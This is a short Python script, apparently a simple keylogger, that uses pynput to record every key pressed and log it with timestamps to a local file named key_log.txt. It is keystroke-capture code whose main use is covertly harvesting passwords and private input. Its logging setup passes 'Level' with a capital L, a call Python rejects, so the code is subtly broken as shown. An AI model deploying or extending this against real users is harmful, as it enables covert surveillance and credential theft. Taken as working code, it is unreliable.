from pynput.keyboard import Key,Listener
import logging
file = "key_log.txt"
logging.basicConfig(filename=file, Level=logging.DEBUG,format ='%(asctime)s %(message)s')
def on_press(key):
    logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()
